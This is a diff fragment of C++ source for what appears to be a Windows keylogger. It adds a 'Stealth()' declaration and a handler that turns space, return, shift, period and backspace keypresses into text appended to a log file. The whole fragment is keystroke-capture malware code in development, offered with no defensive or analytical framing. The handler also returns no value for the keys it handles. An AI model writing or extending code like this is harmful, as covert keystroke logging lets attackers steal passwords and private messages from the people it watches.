@@ -8,6 +8,7 @@ using namespace std;
 
 void Save(string text);
 bool nonLetterButtons(int key);
+void Stealth();
 
 int main()
 {
@@ -41,4 +42,31 @@ void Save(string text)
 	logFile << text;
 	logFile.close();
 
+}
+
+bool nonLetterButtons(int key)
+{
+
+	switch (key)
+	{
+
+	case VK_SPACE:
+		Save(" ");
+		break;
+	case VK_RETURN:
+		Save("\n");
+		break;
+	case VK_SHIFT:
+		Save(" (shift) ");
+		break;
+	case VK_OEM_PERIOD:
+		Save(".");
+		break;
+	case VK_BACK:
+		Save("\b");
+		break;
+	default:
+		return false; //if button is not any of these options(letters), return false
+
+	}
 }
